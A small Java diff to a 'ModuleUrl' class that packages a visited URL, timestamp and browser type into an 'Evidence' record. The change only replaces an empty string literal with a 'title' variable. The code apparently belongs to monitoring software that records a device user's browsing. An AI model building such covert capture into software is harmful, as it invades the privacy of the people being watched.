@@ -106,13 +106,14 @@ public final class ModuleUrl extends BaseModule {
         DateTime datetime = new DateTime(date);
 
         int version = 0x20100713;
+        String title = "";
         final Vector items = new Vector();
 
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
         items.addElement(Utils.intToByteArray(BROWSER_TYPE));
-        items.addElement(WChar.getBytes("",true));
+        items.addElement(WChar.getBytes(title, true));
         items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
         Evidence evidence = new Evidence(EvidenceType.URL);
